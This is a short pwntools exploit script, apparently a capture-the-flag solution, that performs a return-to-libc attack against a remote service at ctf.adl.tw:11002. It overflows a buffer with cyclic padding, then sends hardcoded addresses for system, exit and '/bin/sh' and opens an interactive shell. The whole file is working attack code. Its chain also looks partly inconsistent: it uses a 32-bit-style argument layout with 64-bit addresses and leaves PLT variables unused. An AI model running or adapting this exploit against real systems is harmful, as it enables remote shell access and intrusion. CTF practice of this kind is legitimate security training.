#Return-to-libc

from pwn import *
import struct

print(cyclic(100))

ip = 'ctf.adl.tw'
port = 11002

r = remote(ip, port)
# 0x400510
systemplt =  0x400510
# 0x400734
binsh = 0x400734
payload = "aaaabaaacaaadaaaeaaafaaa"
# system = 0x7ffff7e3fed0
payload += "\xd0\xfe\xe3\xf7\xff\x7f"
# exit = 0x7ffff7e35720
payload += "\x20\x57\xe3\xf7\xff\x7f"
# /bin/sh = 0x7ffff7f7ccee 
payload += "\xee\xcc\xf7\xf7\xff\x7f"
r.sendline(payload)
r.interactive()

